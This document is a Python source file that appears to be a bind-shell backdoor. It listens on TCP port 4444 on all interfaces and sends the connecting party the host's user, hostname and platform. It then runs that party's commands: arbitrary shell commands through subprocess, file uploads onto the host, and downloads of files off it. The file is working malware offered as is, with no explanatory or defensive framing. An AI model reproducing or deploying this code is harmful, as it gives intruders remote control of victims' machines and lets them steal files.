# postive tcp
port = 4444

import os
import socket
import platform
import subprocess
from threading import Thread

client = socket.socket()

def getprompt(systemv):
    if 'Linux' in systemv:
        if os.getuid() ==0 :
            return 'root@'+socket.gethostname()+':'+os.getcwd()+'#'
        else:
            return os.getlogin()+'@'+socket.gethostname()+':'+os.getcwd()+'$'
    else:
        return os.getcwd()+'>'

def getsystemv():
    sysv = platform.platform()
    loginuser = os.getlogin()
    if 'Linux' in sysv:
        if os.getuid() == 0:
            loginuser = 'root'

    return loginuser + '/' + socket.gethostname() + '/' + sysv

def interexploit(server,text):
    print("[+] Connected!")
    try:
        server.send(text.encode('gbk'))
    except Exception: return

    while True:
        try:
            cmd = server.recv(1024).decode('gbk')
            print(cmd)
            other = cmd.split(' ')
            first = other[0]
        except Exception: return

        if first == 'mantis':
            pass

        elif first == 'cd':
            try:
                os.chdir(other[1])
                server.send(getprompt(systemv).encode('gbk'))
            except Exception: # chidir
                server.send(getprompt(systemv).encode('gbk'))

        elif first == 'shell':
            try:
                if len(other) > 1:
                    ccmd =''
                    for i in range(1,len(other)):
                        ccmd += other[i] +' '
                    res = subprocess.Popen(ccmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    result, _ = res.communicate()
                
                    server.send(result)
                    server.send("``````````".encode('gbk'))
            except Exception: return

        elif first == 'upload':
            try:
                dst = other[1]
                fsize = int(other[2])
                content = server.recv(fsize)
                with open(dst,'wb') as f:
                    f.write(content)
            except Exception: return

        elif first == 'download':
            try:
                src = other[1]
                if os.path.isfile(src):
                    fsize = os.path.getsize(src)
                    server.send(str(fsize).encode('gbk'))
                    with open(src,'rb') as f:
                        content = f.read()
                        server.send(content)
                else:
                    server.send(b'0')
            except Exception: return

if __name__ == '__main__':
    client.bind(('0.0.0.0',port))
    client.listen(512)
    systemv = getsystemv()
    text = getprompt(systemv) +'`'+systemv

    while True:
        server, addr = client.accept()
        Thread(target=interexploit,args=(server,text)).start()